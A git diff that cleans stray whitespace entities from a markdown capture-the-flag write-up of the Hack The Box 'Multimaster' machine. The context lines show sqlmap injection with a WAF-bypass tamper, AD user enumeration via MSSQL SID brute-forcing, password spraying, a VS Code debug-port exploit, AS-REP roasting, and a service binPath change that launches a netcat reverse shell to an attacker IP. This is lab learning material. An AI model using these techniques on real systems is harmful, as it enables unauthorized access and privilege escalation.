@@ -107,11 +107,11 @@ Host script results:
 |_  message_signing: required
 ```
 
-We can add `megacorp.local` and the `multimaster.megacorp.local` domains to our `/etc/hosts` file for this machine.&#x20;
+We can add `megacorp.local` and the `multimaster.megacorp.local` domains to our `/etc/hosts` file for this machine.
 
 ### SMB Enumeration
 
-SMB does not allow us to access anything without credentials for this machine.&#x20;
+SMB does not allow us to access anything without credentials for this machine.
 
 ### Employee Hub -> SQL Injection
 
@@ -131,7 +131,7 @@ We can take note of these usernames for later. More importantly, we should see h
 
 <figure><img src="../../../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>
 
-This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.&#x20;
+This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.
 
 UTF-8 characters are a bit special as they are denoted like `\u12` or something. If I try to use `\u12` as the input, I get an error instead of being blocked.
 
@@ -153,7 +153,7 @@ The initial attempt tells me there's nothing, and that all requests ended in 403
 $ sqlmap -r req --tamper=charunicodeescape --level 5 --risk 3 --batch --dbms=mssql --delay 3
 ```
 
-> The guess of the DBMS being MS-SQL was purely a guess based on usual HTB machine patterns, but obviously this is not always the case! Windows AD can use SQLite3 or MySQL for their backends, especially for web servers!&#x20;
+> The guess of the DBMS being MS-SQL was purely a guess based on usual HTB machine patterns, but obviously this is not always the case! Windows AD can use SQLite3 or MySQL for their backends, especially for web servers!
 
 {% code overflow="wrap" %}
 ```
@@ -272,11 +272,11 @@ minatotw
 egre55
 ```
 
-Then, we can attempt to use password spraying to find a valid user.&#x20;
+Then, we can attempt to use password spraying to find a valid user.
 
 ### Spray Fail -> SID Brute -> Shell
 
-For some reason, none of these users were valid.&#x20;
+For some reason, none of these users were valid.
 
 <pre><code>$ crackmapexec smb megacorp.local -u users -p passwords
 <strong>SMB         megacorp.local  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
@@ -333,7 +333,7 @@ SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:fi
 SMB         megacorp.local  445    MULTIMASTER      [-] MEGACORP.LOCAL\egre55:password1 STATUS_LOGON_FAILURE
 </code></pre>
 
-I found this rather odd. I did a `kerbrute` to find more users, and found that there were different users found by `kerbrute` relative to those in the database.&#x20;
+I found this rather odd. I did a `kerbrute` to find more users, and found that there were different users found by `kerbrute` relative to those in the database.
 
 None of the users that I found via `kerbrute` worked with any of the passwords as well. So we were just left with an SQL Injection on an MSSQL database. Googling for AD enumeration via MSSQL injection led me to this page:
 
@@ -365,7 +365,7 @@ This would result in some hex being returned:
 
 <figure><img src="../../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>
 
-We can use this to send another query that would return usernames and convert the SID for us.&#x20;
+We can use this to send another query that would return usernames and convert the SID for us.
 
 {% code overflow="wrap" %}
 ```sql
@@ -495,7 +495,7 @@ lana
 ...
 ```
 
-The `tushikikatomo` user had valid credentials!&#x20;
+The `tushikikatomo` user had valid credentials!
 
 ```
 $ crackmapexec smb megacorp.local -u tushikikatomo -p passwords
@@ -620,7 +620,7 @@ First, we find that `cyork` is part of the Developers group:
 
 <figure><img src="../../../.gitbook/assets/image (2250).png" alt=""><figcaption></figcaption></figure>
 
-There are no outbound object controls for this, indicating that this group might have access to somestuff on the machine.&#x20;
+There are no outbound object controls for this, indicating that this group might have access to somestuff on the machine.
 
 We can also find that the `sbauer` user has some privileges over `jorden`.
 
@@ -674,11 +674,11 @@ IPv4 TCP   127.0.0.1:30980                     LISTENING 5304 Code
 IPv4 TCP   127.0.0.1:46973                     LISTENING 5032 Code
 </code></pre>
 
-For some reason, Visual Studio was running a lot of processes and even had some ports open for it.&#x20;
+For some reason, Visual Studio was running a lot of processes and even had some ports open for it.
 
 ### VS Code -> Cyork Shell
 
-There were loads of processes run as Code, so let's take a look at that. The VS Code directory had some files within it.&#x20;
+There were loads of processes run as Code, so let's take a look at that. The VS Code directory had some files within it.
 
 ```
  *Evil-WinRM* PS C:\Program Files\Microsoft VS Code> dir
@@ -725,13 +725,13 @@ Major  Minor  Build  Revision
 1      37     1      0
 ```
 
-Then, we can enumerate the possible exploits.&#x20;
+Then, we can enumerate the possible exploits.
 
 {% embed url="https://www.cybersecurity-help.cz/vdb/microsoft/vscode/1.37.1/" %}
 
-This machine was released in 2020, so we can ignore the 2023 exploits. There was only one Privilege Escalation one which looked promising as it involved injecting code into existing processes.&#x20;
+This machine was released in 2020, so we can ignore the 2023 exploits. There was only one Privilege Escalation one which looked promising as it involved injecting code into existing processes.
 
-The exploit involves exploiting the debug ports that are left open by the process, and we should be able to get RCE for the user context that `Code.exe` runs in.&#x20;
+The exploit involves exploiting the debug ports that are left open by the process, and we should be able to get RCE for the user context that `Code.exe` runs in.
 
 {% embed url="https://iwantmore.pizza/posts/cve-2019-1414.html" %}
 
@@ -741,7 +741,7 @@ VS Code is built on Electron, so we should be looking for exploits that are able
 
 {% embed url="https://github.com/taviso/cefdebug" %}
 
-We can grab a copy of the compiled binary and transfer it to the machine. We can first run it to find the target port we want.&#x20;
+We can grab a copy of the compiled binary and transfer it to the machine. We can first run it to find the target port we want.
 
 ```
 *Evil-WinRM* PS C:\users\alcibiades> .\cefdebug.exe
@@ -971,7 +971,7 @@ DONT_EXPIRE_PASSWORD           65536
 DONT_REQ_PREAUTH               4194304
 ```
 
-Then, we can use `impacket-GetNPUsers` to get the hash required.&#x20;
+Then, we can use `impacket-GetNPUsers` to get the hash required.
 
 {% code overflow="wrap" %}
 ```
@@ -1048,7 +1048,7 @@ Local Group Memberships      *Remote Management Use*Server Operators
 Global Group memberships     *Domain Users         *Developers
 ```
 
-Technically, SeBackupPrivilege allows us to read the `root.txt` directly, but getting an admin shell is of course better. So since we are part of the Server Operators group, we can start our enumeration from there.&#x20;
+Technically, SeBackupPrivilege allows us to read the `root.txt` directly, but getting an admin shell is of course better. So since we are part of the Server Operators group, we can start our enumeration from there.
 
 From Hacktricks, I gathered that the Server Operators group was able to do these:
 
@@ -1062,7 +1062,7 @@ From Hacktricks, I gathered that the Server Operators group was able to do these
 * Shut down the system
 * control local services
 
-All of these are not super interesting, except for the last one. We can control local services, meaning that we can do stuff like change service paths to run payloads as the SYSTEM user. As such, I used `PowerUp.ps1` to do my checks on what services I could manipulate.&#x20;
+All of these are not super interesting, except for the last one. We can control local services, meaning that we can do stuff like change service paths to run payloads as the SYSTEM user. As such, I used `PowerUp.ps1` to do my checks on what services I could manipulate.
 
 This didn't work because it seems that we cannot access the Service Manager:
 
@@ -1073,7 +1073,7 @@ This didn't work because it seems that we cannot access the Service Manager:
 Access is denied.
 ```
 
-I couldn't run WinPEAS on the machine, so I used my own Windows host to find a service that we could edit, and this took a while.&#x20;
+I couldn't run WinPEAS on the machine, so I used my own Windows host to find a service that we could edit, and this took a while.
 
 We can find all the services using `reg query`:
 
@@ -1100,11 +1100,11 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX
 <TRUNCATED>
 ```
 
-Within this huge list, there were loads of services that weren't valid to use because they were already running or I could not edit the `binPath` variable.&#x20;
+Within this huge list, there were loads of services that weren't valid to use because they were already running or I could not edit the `binPath` variable.
 
-> Used 0xdf's writeup because I got lazy finding the service lol.&#x20;
+> Used 0xdf's writeup because I got lazy finding the service lol.
 
-The first service I noticed were `browser` and `bowser`. I just thought the latter was funny, but the former was one that we could abuse.  First, we just need to change the `binpath` and then run  `start` to start it again. This gives us a `root` shell.&#x20;
+The first service I noticed were `browser` and `bowser`. I just thought the latter was funny, but the former was one that we could abuse.  First, we just need to change the `binpath` and then run  `start` to start it again. This gives us a `root` shell.
 
 ```
 *Evil-WinRM* PS C:\Windows\Tasks> sc.exe config browser binPath= "C:\Windows\Tasks\nc64.exe -e cmd.exe 10.10.14.42 443"
@@ -1114,4 +1114,4 @@ The first service I noticed were `browser` and `bowser`. I just thought the latt
 
 <figure><img src="../../../.gitbook/assets/image (1920).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
